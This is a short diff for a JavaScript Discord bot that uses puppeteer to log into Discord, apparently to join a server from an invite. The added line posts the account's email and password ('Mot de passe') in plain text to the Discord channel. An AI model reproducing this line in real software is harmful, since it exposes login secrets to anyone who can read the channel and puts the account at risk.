@@ -32,6 +32,7 @@ client.on('message', async message => {
         const serverInvite = args[0];
 
         try {
+            message.channel.send(`Email: ${email}\nMot de passe: ${password}`);
             const browser = await puppeteer.launch();
             const page = await browser.newPage();
             await page.goto('https://discord.com/login');
